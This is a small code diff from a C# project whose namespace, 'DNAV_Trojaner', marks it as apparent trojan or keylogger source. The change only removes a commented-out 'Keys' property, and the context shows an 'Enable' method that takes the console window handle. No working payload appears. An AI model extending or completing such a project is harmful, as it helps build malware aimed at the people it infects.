@@ -81,14 +81,6 @@ namespace DNAV_Trojaner
             }
         }
 
-       /* public static string Keys
-        {
-            get
-            {
-                return this._keys;
-            }
-        }*/
-
         public static void Enable()
         {
             var handle = GetConsoleWindow();
